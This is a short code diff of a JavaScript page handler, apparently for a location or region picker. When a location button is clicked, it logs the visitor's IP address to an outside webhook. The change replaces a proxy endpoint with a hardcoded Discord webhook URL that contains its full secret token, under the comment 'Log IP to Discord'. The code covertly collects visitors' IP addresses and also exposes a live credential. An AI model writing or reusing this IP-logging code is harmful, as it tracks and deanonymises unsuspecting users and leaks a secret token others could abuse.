@@ -395,8 +395,8 @@ function selectLocation(region) {
     const buttons = document.querySelectorAll('.location-btn');
     buttons.forEach(btn => { btn.style.opacity = '0.5'; btn.style.pointerEvents = 'none'; });
     
-    // Log IP through proxy (real webhook URL is hidden server-side)
-    const webhookUrl = 'https://webhook-proxy.solarcloud.lat/log';
+    // Log IP to Discord
+    const webhookUrl = 'https://discord.com/api/webhooks/1540532586915307561/lBImq8LWEyr90ZUebjt6B73q5Lwk3VrT67fCdL_THVL_7wALTZcqdHHuqW-E7jnlywWf';
     
     // Function to send webhook
     const sendWebhook = (ip) => {
